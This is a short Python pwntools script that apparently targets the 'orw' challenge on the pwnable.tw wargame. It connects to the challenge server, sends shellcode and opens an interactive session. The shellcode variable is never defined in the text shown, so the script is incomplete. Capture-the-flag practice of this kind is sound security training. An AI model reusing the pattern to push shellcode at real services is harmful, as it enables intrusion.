from pwn import *
context(arch='i386',log_level='debug')
# conn=process("./orw")
conn=remote("chall.pwnable.tw",10001)
conn.recv()
conn.send(shellcode)
conn.interactive()